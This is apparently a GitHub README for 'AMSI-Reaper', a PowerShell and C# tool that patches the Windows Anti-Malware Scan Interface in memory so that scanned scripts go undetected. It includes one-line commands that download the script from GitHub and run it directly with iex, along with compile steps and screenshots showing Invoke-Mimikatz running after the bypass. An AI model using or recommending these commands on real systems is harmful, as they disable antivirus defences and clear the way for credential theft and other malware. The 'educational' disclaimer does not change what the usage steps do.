[![Author](https://img.shields.io/badge/Author-h0ru-darkred)](https://github.com/h0ru)
![Language](https://img.shields.io/badge/Lang-PowerShell-blue.svg)
![Language](https://img.shields.io/badge/Lang-CSharp-green.svg)
[![Github Stars](https://img.shields.io/github/stars/h0ru/AMSI-Reaper)](https://github.com/h0ru/AMSI-Reaper) 
[![GitHub forks](https://img.shields.io/github/forks/h0ru/AMSI-Reaper)](https://github.comh0ru/AMSI-Reaper)

# AMSI-Reaper
![reaper](https://github.com/h0ru/AMSI-Reaper/assets/117091833/24861e69-df06-477d-8844-a0d4015ef830)

> [!WARNING]
> *__The AMSI-Reaper tool is designed mainly for educational and research purposes. The author is not responsible for any misuse, damage, or legal consequences caused by the use of this tool.__*

## Overview
- The [`(AMSI)`](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) is a built-in security feature in Windows that enables applications and services to integrate with antimalware products. It automatically protects against harmful scripts and code in programs like PowerShell.
- AMSI-Reaper is a tool developed in [`PowerShell`](https://github.com/h0ru/AMSI-Reaper/blob/main/src/AMSI-Reaper.ps1) and [`C#`](https://github.com/h0ru/AMSI-Reaper/blob/main/src/AMSI-Reaper.cs) (.NET Framework v4.0) designed to bypass the Anti-Malware Scan Interface  in Windows.
- AMSI-Reaper injects code into the memory of the AMSI components, preventing them from interfering with your scripts.
- Check out more on the [`YouTube Video`](https://youtu.be/rNGQpjJ2rXg?feature=shared)

## Usage
### ◽️ PowerShell Version
- __Download__
```powershell
iex (iwr https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1)
```
```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1')
```
### ◽️ C# Version
- __Download__
```powershell
wget https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.cs -O AMSI-Reaper.cs
```
```powershell
iwr https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.cs -O AMSI-Reaper.cs
```
- __Compile__
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe AMSI-Reaper.cs
```
## Images
### ❌ Invoke-Mimikatz is detected and blocked by AMSI.
![image1](https://github.com/h0ru/AMSI-Reaper/assets/117091833/6dba8127-9fec-41ec-ba8d-f70d01678dea)
### ✔️ AMSI-Reaper in PowerShell, we can request and use it from the command line in real-time.
![image2](https://github.com/h0ru/AMSI-Reaper/assets/117091833/dbcf74d0-a3c3-4e64-a024-3b2bea604f37)
### ✔️ AMSI-Reaper in C# with native Windows features by compiling it with CSC.
![image3](https://github.com/h0ru/AMSI-Reaper/assets/117091833/8906a6ab-d2d8-4ace-906c-2e0869040aa7)
